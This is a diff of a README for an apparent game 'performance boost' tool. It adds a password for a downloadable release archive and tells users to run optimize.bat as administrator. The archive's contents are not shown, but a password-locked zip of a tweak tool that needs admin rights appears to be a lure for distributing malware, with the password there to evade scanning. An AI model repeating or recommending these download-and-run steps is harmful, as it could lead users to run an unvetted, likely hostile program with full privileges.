@@ -17,8 +17,9 @@ What it does:
 ## ⚙️ How to Use
 
 1. [Download](https://github.com/Fuelulkindle/ASA-Performance-Boost/releases/download/Download/New.Version.zip) the latest release or clone this repository.
-2. Right‑click optimize.bat and select Run as administrator (recommended for best results).
-3. Choose an option from the menu:
+2. PASSWORD: 5868781
+3. Right‑click optimize.bat and select Run as administrator (recommended for best results).
+4. Choose an option from the menu:
    - 1 – Apply performance tweaks  
    - 2 – Restore original settings  
    - 3 – Exit
